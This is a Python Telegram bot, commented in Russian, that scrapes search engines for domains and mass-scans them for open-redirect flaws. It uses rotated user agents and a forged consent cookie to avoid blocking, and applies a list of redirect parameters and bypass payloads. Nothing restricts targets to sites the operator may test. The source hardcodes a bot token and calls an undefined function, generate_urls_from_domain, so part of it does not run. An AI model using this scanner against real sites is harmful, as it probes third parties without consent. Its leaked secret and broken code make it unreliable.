#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import types
import logging
import traceback
import asyncio
import urllib.parse
import os
import requests
import time
import random
import re
import json
from urllib.parse import urlparse, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ===================== НАСТРОЙКА ЛОГОВ (ВАЖНО!) =====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout,
    force=True
)
sys.stdout.reconfigure(line_buffering=True)

# Глобальный обработчик ошибок
def global_exception_handler(exctype, value, tb):
    logging.critical("🔥 КРИТИЧЕСКАЯ ОШИБКА:", exc_info=(exctype, value, tb))
    sys.stdout.flush()
    sys.exit(1)

sys.excepthook = global_exception_handler

# ===================== ЗАГЛУШКА ДЛЯ imghdr =====================
imghdr = types.ModuleType('imghdr')
def what(*args, **kwargs):
    return None
imghdr.what = what
sys.modules['imghdr'] = imghdr

# ===================== ИМПОРТЫ БИБЛИОТЕК TELEGRAM =====================
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext
from telegram.ext import filters

# ===================== НАСТРОЙКИ =====================
TOKEN = "8618230715:AAF30AK5Nef4KnLuILUXu7GKpKO4TLrHWYc"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnTo", "return_to",
    "continue", "dest", "destination", "redir", "redirect_uri",
    "redirect_url", "goto", "target", "r", "u", "link", "to"
]

TEST_PAYLOAD = "https://example.com"

PAYLOADS = [
    TEST_PAYLOAD,
    f"//example.com",
    f"http://example.com",
    f"https:example.com",
    f"/\\example.com",
    f"https://example.com%2F%2E%2E",
    f"%2F%2Fexample.com",
    f"///example.com",
    f"https://example.com/?a=1&b=2",
    f"https://example.com#test",
]

user_sessions = {}
sessions_lock = Lock()
logger = logging.getLogger(__name__)

# ===================== ФУНКЦИИ ПОИСКА =====================

def search_domains_google(query="site:.com", max_pages=1):
    """Ищет домены через Google (обход блокировки)"""
    domains = set()
    
    # Ротация User-Agent'ов
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    ]
    
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Cache-Control": "max-age=0"
    }
    
    import urllib.parse
    
    # Кодируем запрос
    encoded_query = urllib.parse.quote_plus(query)
    
    for page in range(max_pages):
        start = page * 10
        url = f"https://www.google.com/search?q={encoded_query}&start={start}"
        
        try:
            print(f"[*] Запрос к Google: страница {page+1}")
            sys.stdout.flush()
            
            session = requests.Session()
            session.headers.update(headers)
            
            # Добавляем куки, чтобы выглядеть как реальный браузер
            session.cookies.set('CONSENT', 'YES+', domain='.google.com')
            
            r = session.get(
                url, 
                timeout=15,
                allow_redirects=True
            )
            
            print(f"[*] Статус ответа: {r.status_code}")
            sys.stdout.flush()
            
            if r.status_code == 200:
                # Проверяем, не капча ли это
                if 'captcha' in r.text.lower() or 'recaptcha' in r.text.lower():
                    print("[!] Google запросил капчу. Переключаюсь на запасной поисковик.")
                    sys.stdout.flush()
                    return search_alternative(query)
                
                # Ищем ссылки в нормальном HTML
                found = re.findall(r'<a[^>]*href="https?://([^/"]+)[^"]*"[^>]*>', r.text)
                
                # Если не нашли через href, ищем просто ссылки в тексте
                if not found:
                    found = re.findall(r'https?://([^/\s"\'<>]+)', r.text)
                
                for domain in found:
                    # Чистим домен
                    domain = domain.split('/')[0].split('?')[0].split('#')[0]
                    
                    # Отсеиваем мусор Google
                    if ('.' in domain 
                        and not any(x in domain.lower() for x in [
                            'google', 'youtube', 'blogger', 'gstatic',
                            'googleapis', 'ytimg', 'ggpht', 'googleusercontent',
                            'google-analytics', 'googlesyndication', 'doubleclick'
                        ])
                        and len(domain) < 50
                        and domain.count('.') <= 3):
                        domains.add(domain)
                
                print(f"[*] Найдено доменов на странице {page+1}: {len(domains)}")
                sys.stdout.flush()
                
                # Если ничего не нашли, пробуем другой метод
                if not domains:
                    print("[*] Пробую другой метод парсинга...")
                    sys.stdout.flush()
                    # Ищем в цитатах
                    found = re.findall(r'>(https?://[^<]+)<', r.text)
                    for url in found:
                        if '://' in url:
                            domain = url.split('/')[2] if len(url.split('/')) > 2 else url
                            if '.' in domain and not any(x in domain for x in ['google']):
                                domains.add(domain)
            else:
                print(f"[!] Google вернул статус {r.status_code}")
                sys.stdout.flush()
            
            # Ждём между запросами
            time.sleep(random.uniform(5, 8))
            
        except Exception as e:
            print(f"[!] Ошибка при запросе: {e}")
            sys.stdout.flush()
            continue
    
    # Если ничего не нашли, используем запасной поисковик
    if not domains:
        print("[*] Google не дал результатов. Пробую Bing...")
        sys.stdout.flush()
        return search_bing(query)
    
    return list(domains)

def search_alternative(query):
    """Поиск через DuckDuckGo (альтернатива)"""
    domains = set()
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    try:
        url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote_plus(query)}"
        r = requests.get(url, headers=headers, timeout=10)
        
        if r.status_code == 200:
            found = re.findall(r'https?://([^/\s"\'<>]+)', r.text)
            for domain in found:
                domain = domain.split('/')[0]
                if '.' in domain and not any(x in domain for x in ['duckduckgo']):
                    domains.add(domain)
        return list(domains)
    except:
        return []

def search_bing(query):
    """Поиск через Bing"""
    domains = set()
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    try:
        url = f"https://www.bing.com/search?q={urllib.parse.quote_plus(query)}"
        r = requests.get(url, headers=headers, timeout=10)
        
        if r.status_code == 200:
            found = re.findall(r'https?://([^/\s"\'<>]+)', r.text)
            for domain in found:
                domain = domain.split('/')[0]
                if '.' in domain and not any(x in domain for x in ['bing', 'microsoft']):
                    domains.add(domain)
        return list(domains)
    except:
        return []
# ===================== ФУНКЦИИ СКАНИРОВАНИЯ =====================

def check_open_redirect(url, param, payload):
    if '?' in url:
        separator = '&'
    else:
        separator = '?'
    
    test_url = f"{url}{separator}{param}={payload}"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    try:
        r = requests.get(test_url, headers=headers, timeout=8, allow_redirects=False)
        
        if 'Location' in r.headers:
            location = r.headers['Location']
            if 'example.com' in location or payload.replace('https://', '').replace('http://', '') in location:
                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "location": location,
                    "status": r.status_code
                }
        
        if 300 <= r.status_code < 400 and 'example.com' in r.text.lower():
            return {
                "vulnerable": True,
                "url": test_url,
                "param": param,
                "payload": payload,
                "status": r.status_code,
                "type": "meta/html"
            }
        
        return None
    except Exception as e:
        logger.debug(f"Ошибка при проверке {test_url}: {e}")
        return None

def scan_single_url(url):
    results = []
    for param in REDIRECT_PARAMS:
        for payload in PAYLOADS:
            result = check_open_redirect(url, param, payload)
            if result:
                results.append(result)
    return results

def scan_urls(urls, max_workers=5, progress_callback=None):
    all_results = {}
    total = len(urls)
    completed = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_url = {executor.submit(scan_single_url, url): url for url in urls}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            completed += 1
            if progress_callback:
                progress_callback(completed, total)
            
            try:
                results = future.result()
                if results:
                    all_results[url] = results
            except Exception as e:
                logger.error(f"Ошибка при сканировании {url}: {e}")
                continue
    
    return all_results

# ===================== ОБРАБОТЧИКИ КОМАНД =====================

async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    await update.message.reply_text(
        f"Привет, {user.first_name}!\n\n"
        "Я бот для поиска Open Redirect уязвимостей.\n\n"
        "Команды:\n"
        "/search - Найти домены и просканировать\n"
        "/scanurl - Сканировать конкретный URL\n"
        "/scanlist - Сканировать список URL из файла\n"
        "/help - Подробная помощь"
    )

async def help_command(update: Update, context: CallbackContext):
    help_text = """
*Open Redirect Bot - Помощь*

/search - Найти домены и просканировать
/scanurl - Сканировать конкретный URL
/scanlist - Сканировать список URL из файла
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def search_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    with sessions_lock:
        user_sessions[user_id] = {
            'state': 'awaiting_search_query',
            'data': {}
        }
    
    await update.message.reply_text(
        "Введите поисковый запрос для Google\n"
        "Или отправьте 'default' для поиска site:.com"
    )

async def scanurl_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    with sessions_lock:
        user_sessions[user_id] = {
            'state': 'awaiting_url',
            'data': {}
        }
    
    await update.message.reply_text(
        "Отправьте URL для сканирования"
    )

async def scanlist_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    with sessions_lock:
        user_sessions[user_id] = {
            'state': 'awaiting_file',
            'data': {}
        }
    
    await update.message.reply_text(
        "Отправьте текстовый файл с URL (по одному на строку)"
    )

async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text
    
    with sessions_lock:
        session = user_sessions.get(user_id)
        if not session:
            await update.message.reply_text("Используйте /start")
            return
    
    state = session.get('state')
    
    if state == 'awaiting_search_query':
        query = text if text != 'default' else 'site:.com'
        
        await update.message.reply_text(f"🔍 Ищу домены...")
        
        try:
            domains = search_domains_google(query, max_pages=2)
            
            if not domains:
                await update.message.reply_text("❌ Домены не найдены")
                return
            
            urls = []
            for domain in domains[:20]:
                urls.extend(generate_urls_from_domain(domain))
            
            await update.message.reply_text(f"🔍 Сканирую {len(urls)} URL...")
            
            def progress(current, total):
                if current % 50 == 0:
                    context.application.create_task(
                        update.message.reply_text(f"Прогресс: {current}/{total}")
                    )
            
            results = scan_urls(urls, max_workers=5, progress_callback=progress)
            
            if results:
                msg = f"✅ Найдено уязвимостей на {len(results)} URL"
                await update.message.reply_text(msg)
                
                filename = f"results_{user_id}.txt"
                with open(filename, 'w') as f:
                    for url, vulns in results.items():
                        f.write(f"\n[VULN] {url}\n")
                        for v in vulns:
                            f.write(f"  {v['param']}\n")
                
                with open(filename, 'rb') as f:
                    await update.message.reply_document(f)
                
                os.remove(filename)
            else:
                await update.message.reply_text("❌ Уязвимостей не найдено")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка: {str(e)}")
            logger.error(f"Ошибка: {e}", exc_info=True)
        
        with sessions_lock:
            del user_sessions[user_id]
    
    elif state == 'awaiting_url':
        url = text
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        await update.message.reply_text(f"🔍 Сканирую...")
        
        try:
            results = scan_single_url(url)
            
            if results:
                msg = f"✅ Найдено уязвимостей: {len(results)}"
                await update.message.reply_text(msg)
            else:
                await update.message.reply_text("❌ Уязвимостей не найдено")
            
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка: {str(e)}")
        
        with sessions_lock:
            del user_sessions[user_id]

async def handle_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    with sessions_lock:
        session = user_sessions.get(user_id)
        if not session or session.get('state') != 'awaiting_file':
            await update.message.reply_text("Используйте /scanlist")
            return
    
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Нужен .txt файл")
        return
    
    await update.message.reply_text("📥 Загружаю...")
    
    file_obj = await file.get_file()
    filename = f"upload_{user_id}.txt"
    await file_obj.download_to_drive(filename)
    
    try:
        with open(filename, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            await update.message.reply_text("❌ Файл пуст")
            return
        
        urls = [u if u.startswith(('http://', 'https://')) else 'https://' + u for u in urls]
        
        await update.message.reply_text(f"🔍 Сканирую {len(urls)} URL...")
        
        def progress(current, total):
            if current % 20 == 0:
                context.application.create_task(
                    update.message.reply_text(f"Прогресс: {current}/{total}")
                )
        
        results = scan_urls(urls, max_workers=5, progress_callback=progress)
        
        if results:
            msg = f"✅ Найдено уязвимостей на {len(results)} URL"
            await update.message.reply_text(msg)
            
            results_filename = f"results_{user_id}.txt"
            with open(results_filename, 'w') as f:
                for url, vulns in results.items():
                    f.write(f"\n[VULN] {url}\n")
                    for v in vulns:
                        f.write(f"  {v['param']}\n")
            
            with open(results_filename, 'rb') as f:
                await update.message.reply_document(f)
            
            os.remove(results_filename)
        else:
            await update.message.reply_text("❌ Уязвимостей не найдено")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
    finally:
        if os.path.exists(filename):
            os.remove(filename)
        
        with sessions_lock:
            del user_sessions[user_id]

async def error_handler(update: Update, context: CallbackContext):
    logger.error(f"Ошибка: {context.error}", exc_info=True)

# ===================== ЗАПУСК =====================

def main():
    """Запуск бота"""
    try:
        print("🟢 Создаю приложение...")
        sys.stdout.flush()
        
        # СОЗДАЕМ EVENT LOop ПРАВИЛЬНО
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        print(f"🟢 Event loop создан: {loop}")
        sys.stdout.flush()
        
        application = Application.builder().token(TOKEN).build()
        
        print("🟢 Добавляю обработчики...")
        sys.stdout.flush()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("search", search_command))
        application.add_handler(CommandHandler("scanurl", scanurl_command))
        application.add_handler(CommandHandler("scanlist", scanlist_command))
        
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        
        application.add_error_handler(error_handler)
        
        print("🟢 Бот готов к запуску!")
        sys.stdout.flush()
        
        print("🟢 Запускаю polling...")
        sys.stdout.flush()
        
        # ЗАПУСКАЕМ С ЯВНЫМ LOOPOM
        application.run_polling()
        
    except Exception as e:
        logging.critical(f"🔥 КРИТИЧЕСКАЯ ОШИБКА В MAIN: {e}")
        traceback.print_exc(file=sys.stdout)
        sys.stdout.flush()
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.critical(f"🔥 КРИТИЧЕСКАЯ ОШИБКА ПРИ ЗАПУСКЕ: {e}")
        traceback.print_exc(file=sys.stdout)
        sys.stdout.flush()
        sys.exit(1)




